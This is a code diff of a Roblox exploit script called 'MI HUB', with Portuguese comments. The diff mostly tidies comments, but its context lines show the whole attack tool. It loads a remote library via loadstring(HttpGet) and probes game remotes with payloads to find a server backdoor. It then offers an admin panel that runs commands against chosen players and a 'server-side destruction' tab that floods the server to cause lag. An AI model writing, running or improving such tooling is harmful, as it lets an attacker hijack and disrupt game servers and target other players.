@@ -1,13 +1,11 @@
 -- language: Lua, target: Roblox
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local TweenService = game:GetService("TweenService")
 local LP = Players.LocalPlayer
 
--- Carrega a AURA UI
 local Aura = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sync7771/lib-test/refs/heads/main/AURA%20HUB"))()
 
--- Cria uma janela temporária de scan
+-- Cria a janela de Scan
 local scanWin = Aura:CreateWindow({
     Title = "MI HUB | SCANNING", 
     Subtitle = "Procurando Backdoor...",
@@ -20,8 +18,8 @@ scanWin:SetAccent(Color3.fromRGB(255, 0, 0))
 local scanTab = scanWin:CreateTab({Name = "Scan", Icon = "search"})
 local statusLabel = scanTab:CreateLabel({Name = "Iniciando varredura..."})
 
--- Lógica de Scan
 local backdoorRemote = nil
+
 local function scanRemotes()
     local remotes = {}
     local seen = {}
@@ -73,7 +71,6 @@ local function scanRemotes()
     return nil, "Nenhuma backdoor respondeu ao payload."
 end
 
--- Inicia o scan
 task.spawn(function()
     statusLabel:Set("Enviando payloads...")
     local foundRemote, msg = scanRemotes()
@@ -84,10 +81,10 @@ task.spawn(function()
         scanWin:Notify({Title = "Sucesso", Content = "Backdoor achada em: " .. foundRemote:GetFullName(), Duration = 5})
         
         task.wait(2)
-        scanWin:Destroy() -- Fecha a janela de scan
+        scanWin:Destroy() 
         
         -- ============================================================
-        -- ABRE A JANELA REAL DO MI HUB (Com comandos)
+        -- JANELA PRINCIPAL (Comandos)
         -- ============================================================
         local win = Aura:CreateWindow({
             Title = "MI HUB | HELL", 
@@ -100,11 +97,10 @@ task.spawn(function()
         win:SetFloatingButton({Text = "MI", Size = 50, TextColor = Color3.fromRGB(255, 0, 0)})
         win:SetAccent(Color3.fromRGB(255, 0, 0))
 
-        -- ABA: ADMIN (Envia comandos via backdoorRemote)
+        local selectedTarget = ""
         local tabAdmin = win:CreateTab({Name = "Admin", Icon = "shield"})
         local grpPlayer = tabAdmin:CreateGroup({Name = "Alvo", Description = "Escolha o alvo"})
 
-        local selectedTarget = ""
         grpPlayer:CreatePlayerList({
             Name = "Jogadores",
             Height = 120,
@@ -118,7 +114,6 @@ task.spawn(function()
         tabAdmin:CreateSpacer(10)
         local grpAcoes = tabAdmin:CreateGroup({Name = "Ações (Via Backdoor)"})
         
-        -- Função helper para mandar comando
         local function sendCmd(cmd, args)
             if not backdoorRemote then return end
             local code = ""
@@ -170,7 +165,6 @@ task.spawn(function()
             end
         end})
 
-        -- ABA: SERVER
         local tabServer = win:CreateTab({Name = "Server", Icon = "server"})
         local grpServer = tabServer:CreateGroup({Name = "Destruição Server-Side"})
 
@@ -192,7 +186,6 @@ task.spawn(function()
             pcall(function() backdoorRemote:FireServer(code) end)
             win:Notify({Title = "Lag", Content = "Sobrecarga enviada.", Duration = 2})
         end})
-
     else
         statusLabel:Set("Falha: " .. msg)
         scanWin:Notify({Title = "Falha no Scan", Content = msg, Duration = 10})
